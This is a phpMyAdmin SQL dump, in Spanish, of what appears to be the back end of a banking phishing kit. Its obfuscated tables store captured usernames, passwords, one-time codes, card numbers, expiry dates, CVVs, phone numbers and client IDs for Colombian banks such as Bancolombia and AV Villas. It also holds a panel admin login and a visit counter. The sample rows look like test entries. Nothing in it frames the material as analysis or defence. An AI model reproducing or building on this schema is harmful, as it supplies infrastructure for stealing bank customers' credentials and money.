-- phpMyAdmin SQL Dump
-- version 5.1.1
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 23-06-2025 a las 16:50:50
-- Versión del servidor: 10.4.20-MariaDB
-- Versión de PHP: 8.0.9

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `metr0n1c2`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `m3it3m`
--

CREATE TABLE `m3it3m` (
  `idreg` int(11) NOT NULL,
  `usuario` varchar(60) DEFAULT NULL,
  `password` varchar(30) DEFAULT NULL,
  `otp` varchar(30) DEFAULT NULL,
  `dispositivo` varchar(20) DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL,
  `id` varchar(50) DEFAULT NULL,
  `agente` varchar(20) DEFAULT NULL,
  `banco` varchar(30) DEFAULT NULL,
  `status` int(20) DEFAULT NULL,
  `horacreado` datetime NOT NULL,
  `horamodificado` datetime NOT NULL,
  `email` varchar(60) DEFAULT NULL,
  `cemail` varchar(20) DEFAULT NULL,
  `tarjeta` varchar(40) DEFAULT NULL,
  `ftarjeta` varchar(30) DEFAULT NULL,
  `cvv` varchar(10) DEFAULT NULL,
  `celular` varchar(40) DEFAULT NULL,
  `idcliente` varchar(25) DEFAULT NULL,
  `lineaclaro` varchar(25) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `m3it3m`
--

INSERT INTO `m3it3m` (`idreg`, `usuario`, `password`, `otp`, `dispositivo`, `ip`, `id`, `agente`, `banco`, `status`, `horacreado`, `horamodificado`, `email`, `cemail`, `tarjeta`, `ftarjeta`, `cvv`, `celular`, `idcliente`, `lineaclaro`) VALUES
(495, '323.213.123', 'dfsdf4324324', '423432', 'iPhone', '192.168.0.24', NULL, NULL, 'AV Villas', 10, '2025-06-11 12:51:40', '2025-06-11 12:52:18', NULL, NULL, NULL, NULL, NULL, NULL, '1083876345', '[object Object]'),
(496, 'camlo32432', '1384', '456568', 'iPhone', '192.168.0.24', NULL, NULL, 'Bancolombia', 10, '2025-06-11 12:54:27', '2025-06-11 12:55:27', 'carlos@gmial.com', '23432432', NULL, NULL, NULL, '3000000000', '1083654243', '[object Object]'),
(497, NULL, NULL, NULL, 'iPhone', '192.168.0.24', NULL, NULL, NULL, 10, '2025-06-11 12:58:26', '2025-06-11 12:58:26', NULL, NULL, NULL, NULL, NULL, NULL, '1084654321', '[object Object]'),
(498, NULL, NULL, NULL, 'iPhone', '192.168.0.24', NULL, NULL, NULL, 10, '2025-06-11 13:00:59', '2025-06-11 13:00:59', NULL, NULL, NULL, NULL, NULL, NULL, '432432', '[object Object]'),
(499, NULL, NULL, NULL, 'iPhone', '192.168.0.24', NULL, NULL, NULL, 10, '2025-06-11 13:01:18', '2025-06-11 13:01:18', NULL, NULL, NULL, NULL, NULL, NULL, '4234324', '[object Object]'),
(500, NULL, NULL, NULL, 'iPhone', '192.168.0.24', NULL, NULL, NULL, 10, '2025-06-11 13:02:02', '2025-06-11 13:02:02', NULL, NULL, NULL, NULL, NULL, NULL, '324324234324', '[object Object]'),
(501, '1.084.563.876', 'fsd324324', '432432', 'iPhone', '192.168.0.24', NULL, NULL, 'AV Villas', 4, '2025-06-11 13:02:47', '2025-06-11 13:03:22', NULL, NULL, NULL, NULL, NULL, NULL, '1084637284', '[object Object]');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `m3us3r`
--

CREATE TABLE `m3us3r` (
  `usuario` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `hora` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `m3us3r`
--

INSERT INTO `m3us3r` (`usuario`, `password`, `hora`) VALUES
('admin', '123456', '2021-12-30 00:00:00');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `m3v1s1t`
--

CREATE TABLE `m3v1s1t` (
  `contador` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Volcado de datos para la tabla `m3v1s1t`
--

INSERT INTO `m3v1s1t` (`contador`) VALUES
(0);

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `m3it3m`
--
ALTER TABLE `m3it3m`
  ADD PRIMARY KEY (`idreg`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `m3it3m`
--
ALTER TABLE `m3it3m`
  MODIFY `idreg` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=502;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
